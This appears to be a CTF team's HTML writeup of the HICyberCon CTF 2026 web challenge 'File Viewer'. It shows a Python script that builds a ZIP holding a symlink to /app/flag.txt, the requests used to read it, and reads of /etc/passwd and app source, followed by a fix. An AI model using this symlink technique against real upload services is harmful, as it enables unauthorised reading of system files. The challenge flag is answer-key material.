@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>File Viewer · HICyberCon CTF 2026 writeup · NXT_CTFS</title>
+<meta name="description" content="The Zip Checker extracts uploads and serves each member back by URL. A ZIP entry stored as a symlink to /app/flag.txt is followed when served, turning the viewer into an arbitrary file read." />
+<link rel="icon" href="../images/brand/logo-v2.png" type="image/png" />
+<link rel="stylesheet" href="../css/fonts.css?v=80d02232" />
+<link rel="stylesheet" href="../css/base.css?v=158fffd0" />
+<link rel="stylesheet" href="../css/components.css?v=9bb4ee8e" />
+<link rel="stylesheet" href="../css/pages.css?v=15906e9c" />
+<script>document.documentElement.classList.add('js');</script>
+</head>
+<body>
+
+<nav class="nav" id="nav">
+  <div class="container nav-inner">
+    <div class="nav-id">
+      <a href="../index.html#top" class="brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span class="brand-name">NXT_CTFS</span>
+      </a>
+    </div>
+    <div class="nav-links">
+      <a href="../writeups.html" class="is-active">writeups</a>
+      <a href="../index.html#team">team</a>
+      <a href="../index.html#shell">try a box</a>
+      <a href="../index.html#join">join</a>
+    </div>
+    <div class="nav-cta">
+      <a href="../index.html#join" class="btn btn-secondary">Join us</a>
+      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu" aria-expanded="false">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round">
+          <line x1="4" y1="7" x2="20" y2="7"></line>
+          <line x1="4" y1="12" x2="20" y2="12"></line>
+          <line x1="4" y1="17" x2="20" y2="17"></line>
+        </svg>
+      </button>
+    </div>
+  </div>
+  <div class="mobile-panel" id="mobilePanel">
+    <a href="../writeups.html">writeups</a>
+    <a href="../index.html#team">team</a>
+    <a href="../index.html#shell">try a box</a>
+    <a href="../index.html#join">join</a>
+  </div>
+</nav>
+
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="page-main container" id="top">
+  <nav class="crumbs" aria-label="Breadcrumb"><a href="../index.html#top">nxt_ctfs</a> <span aria-hidden="true">/</span> <a href="../writeups.html">writeups</a> <span aria-hidden="true">/</span> <a href="../events/hicybercon-ctf-2026.html">hicybercon-ctf-2026</a> <span aria-hidden="true">/</span> <span>file-viewer</span></nav>
+
+  <header class="page-head">
+    
+    <div class="page-head-body">
+      <h1>File Viewer <span class="page-sub">ZIP symlink to arbitrary file read</span></h1>
+      <div class="page-meta"><span class="wu-cat wu-cat-web">web</span></div>
+      
+      <div class="wu-flagrow">
+        <span class="wu-flagrow-k">flag</span>
+        <code id="wuFlag">hiCTF{E45Y_5yml1Nk_0636e6760a}</code>
+        <button type="button" class="wu-copy" data-copy="#wuFlag" aria-label="Copy flag">copy</button>
+      </div>
+    </div>
+  </header>
+
+    <div class="wu-layout">
+    <article class="wu-article">
+<p><strong>Category:</strong> Web · live instance (&quot;Zip Checker&quot;) · 83 pts / 98 solves · author <code>0x0Sayan</code></p>
+<blockquote>
+<p>Credit: this solve follows team Fr4ctur3&#39;s public writeup
+(<code>ushoxa/HI-Cyber-Con-2026-CTF</code>). The instance was down after the event, so it
+was not re-run here.</p>
+</blockquote>
+<h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
+<p>&quot;File Viewer&quot; is a <strong>Zip Checker</strong>: upload a ZIP, and the app lists the extracted
+members, each served back through a generated URL of the form</p>
+<figure class="wu-code wu-code-output" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">POST /analyze      (multipart/form-data, field `file`)
+GET  /&lt;random_token&gt;/&lt;member&gt;</code></pre>
+      
+    </figure><p>Uploading a benign archive and opening <code>/&lt;token&gt;/hello.txt</code> returns the member&#39;s
+contents - the app extracts the archive and serves the members back.</p>
+<h2 id="the-bug-zip-symlink-arbitrary-file-read"><a class="wu-anchor" href="#the-bug-zip-symlink-arbitrary-file-read" aria-hidden="true">#</a>The bug - ZIP symlink → arbitrary file read</h2>
+<p>A ZIP entry can be a <strong>symbolic link</strong> rather than a regular file. When the
+server extracts the archive and <em>follows</em> the link while serving the member, an
+attacker can read files outside the extraction directory. Path-traversal
+(<code>../</code>), command injection and template injection all failed; the symlink entry
+succeeded.</p>
+<h2 id="exploitation"><a class="wu-anchor" href="#exploitation" aria-hidden="true">#</a>Exploitation</h2>
+<p>Build an archive whose member is a symlink to the flag:</p>
+<figure class="wu-code" data-lines="6">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-keyword">import</span> zipfile, stat</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-keyword">with</span> zipfile.ZipFile(<span class="hljs-string">&quot;exploit.zip&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> z:</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">    info = zipfile.ZipInfo(<span class="hljs-string">&quot;links/flag.txt&quot;</span>)</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">    info.create_system = <span class="hljs-number">3</span>                       <span class="hljs-comment"># Unix metadata</span></span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">    info.external_attr = (stat.S_IFLNK | <span class="hljs-number">0o777</span>) &lt;&lt; <span class="hljs-number">16</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">    z.writestr(info, <span class="hljs-string">&quot;/app/flag.txt&quot;</span>)            <span class="hljs-comment"># symlink target = contents</span></span></span></code></pre>
+      
+    </figure><p>Upload it through <code>/analyze</code>, then request the extracted symlink:</p>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">GET /&lt;upload_token&gt;/links/flag.txt</code></pre>
+      
+    </figure><p>The server follows the link and returns:</p>
+<figure class="wu-code wu-code-output" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-text">HTTP 200 OK
+Content-Type: text/plain; charset=utf-8
+
+hiCTF{E45Y_5yml1Nk_0636e6760a}</code></pre>
+      
+    </figure><p>Other targets behaved consistently (<code>/etc/passwd</code>, <code>/etc/hostname</code>,
+<code>/proc/self/cwd/app.py</code> all returned <code>200</code>; <code>/flag.txt</code>, <code>/app/flag</code> returned
+<code>404</code>), confirming a general arbitrary-file-read primitive rooted at following
+attacker-controlled symlinks.</p>
+<h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-text">hiCTF{E45Y_5yml1Nk_0636e6760a}</code></pre>
+      
+    </figure><h2 id="root-cause-fix"><a class="wu-anchor" href="#root-cause-fix" aria-hidden="true">#</a>Root cause / fix</h2>
+<p>Extraction into a per-upload directory is not enough if the file-serving endpoint
+<strong>follows symlinks</strong> out of it. Reject symlink entries in untrusted archives, or
+resolve each served path and verify it stays inside the upload root.</p>
+
+    </article>
+    <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
+        <p class="wu-toc-h">On this page</p>
+        <ol><li><a href="#recon">Recon</a></li><li><a href="#the-bug-zip-symlink-arbitrary-file-read">The bug - ZIP symlink → arbitrary file read</a></li><li><a href="#exploitation">Exploitation</a></li><li><a href="#flag">Flag</a></li><li><a href="#root-cause-fix">Root cause / fix</a></li></ol>
+      </nav>
+  </div>
+
+  <nav class="wu-pager" aria-label="More writeups">
+    <a class="wu-pager-link wu-pager-prev" href="stillwell-estates.html"><span class="wu-pager-dir">&larr; Previous</span><span class="wu-pager-name">Stillwell Estates</span></a>
+    <a class="wu-pager-link wu-pager-next" href="titan-relay.html"><span class="wu-pager-dir">Next &rarr;</span><span class="wu-pager-name">Titan Relay</span></a>
+  </nav>
+</main>
+
+<footer class="footer container">
+  <div class="footer-grid">
+    <div>
+      <a href="../index.html#top" class="footer-brand">
+        <img src="../images/brand/logo-v2.png" alt="NXT_CTFS logo" />
+        <span>NXT_CTFS</span>
+      </a>
+      <p class="footer-tag">A team built around curiosity, persistence, and the occasional 3am breakthrough.</p>
+    </div>
+    <div class="footer-col">
+      <h4>Connect</h4>
+      <a href="https://discord.gg/AnmfSNMvS" target="_blank" rel="noopener noreferrer">Discord</a>
+      <a href="https://github.com/HappyCPPD/NxT-s-Team-Library" target="_blank" rel="noopener noreferrer">GitHub</a>
+      <a href="https://ctftime.org/team/442864" target="_blank" rel="noopener noreferrer">CTFtime</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>&copy; 2026 NXT_CTFS. All rights reserved.</span>
+    <span class="footer-hint">Two flags on this page. One is in the sandbox.</span>
+  </div>
+</footer>
+
+<script src="../js/script.js?v=2912532e"></script>
+</body>
+</html>
